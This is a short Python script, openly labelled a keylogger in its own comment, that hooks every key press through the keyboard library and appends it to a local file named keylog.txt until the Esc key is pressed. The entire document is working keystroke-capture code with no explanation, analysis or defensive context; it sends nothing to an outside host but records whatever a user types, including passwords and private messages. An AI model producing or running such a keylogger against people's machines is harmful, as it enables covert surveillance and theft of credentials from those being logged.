import keyboard

def write_to_file(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\n")

keyboard.on_press(write_to_file)

keyboard.wait('esc')  # Press the 'esc' key to stop the keylogger
